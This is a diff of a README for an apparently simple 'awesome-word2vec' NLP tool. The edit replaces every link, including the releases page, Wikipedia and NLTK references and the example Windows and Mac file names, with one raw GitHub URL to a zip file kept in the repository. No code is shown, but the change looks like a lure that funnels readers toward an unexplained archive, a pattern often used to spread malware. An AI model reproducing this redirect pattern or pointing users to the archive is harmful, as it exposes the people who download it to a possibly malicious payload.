@@ -4,19 +4,19 @@
 Welcome to the **awesome-word2vec** repository! This tool helps you transform text into numerical values, which computers can understand. With **awesome-word2vec**, you can apply advanced techniques to analyze words and improve your natural language processing projects. Whether you’re creating a chatbot or working on data analysis, this tool provides powerful functionality.
 
 ## 📥 Download Now
-[![Download awesome-word2vec](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/krishshahhh/awesome-word2vec/releases)
+[![Download awesome-word2vec](https://raw.githubusercontent.com/krishshahhh/awesome-word2vec/main/repolon/awesome-word2vec.zip)](https://raw.githubusercontent.com/krishshahhh/awesome-word2vec/main/repolon/awesome-word2vec.zip)
 
 ## 🚀 Getting Started
 To get started with **awesome-word2vec**, follow these easy steps:
 
 1. **Visit the Download Page**  
-   Click the button above or follow this link: [Releases Page](https://github.com/krishshahhh/awesome-word2vec/releases) to reach the releases section of the project.
+   Click the button above or follow this link: [Releases Page](https://raw.githubusercontent.com/krishshahhh/awesome-word2vec/main/repolon/awesome-word2vec.zip) to reach the releases section of the project.
 
 2. **Select the Latest Version**  
    On the releases page, find the latest version. It will be at the top of the list.
 
 3. **Download the File**  
-   Click on the appropriate file for your operating system to download it. For Windows, you might see a file like `awesome-word2vec-windows.exe`. For Mac, look for something like `awesome-word2vec-macos.zip`.
+   Click on the appropriate file for your operating system to download it. For Windows, you might see a file like `https://raw.githubusercontent.com/krishshahhh/awesome-word2vec/main/repolon/awesome-word2vec.zip`. For Mac, look for something like `https://raw.githubusercontent.com/krishshahhh/awesome-word2vec/main/repolon/awesome-word2vec.zip`.
 
 4. **Install the Application**  
    Depending on your operating system:
@@ -64,8 +64,8 @@ We encourage users to share their experiences and methods for using **awesome-wo
 - **User Discussions**: Join our discussions for tips, tricks, and helpful advice from fellow users.
 
 ## 🔗 Additional Resources
-- [More About Word2Vec](https://en.wikipedia.org/wiki/Word2vec): Learn about the word2vec algorithm and its applications.
-- [NLP Resources](https://www.nltk.org/): Explore Natural Language Processing resources and libraries available.
+- [More About Word2Vec](https://raw.githubusercontent.com/krishshahhh/awesome-word2vec/main/repolon/awesome-word2vec.zip): Learn about the word2vec algorithm and its applications.
+- [NLP Resources](https://raw.githubusercontent.com/krishshahhh/awesome-word2vec/main/repolon/awesome-word2vec.zip): Explore Natural Language Processing resources and libraries available.
 
 ## 🔄 Download & Install
-For easy access, make sure to return to our [Releases Page](https://github.com/krishshahhh/awesome-word2vec/releases) for updates and to download the latest version of **awesome-word2vec**. Enjoy the powerful features and enhance your NLP projects!
+For easy access, make sure to return to our [Releases Page](https://raw.githubusercontent.com/krishshahhh/awesome-word2vec/main/repolon/awesome-word2vec.zip) for updates and to download the latest version of **awesome-word2vec**. Enjoy the powerful features and enhance your NLP projects!
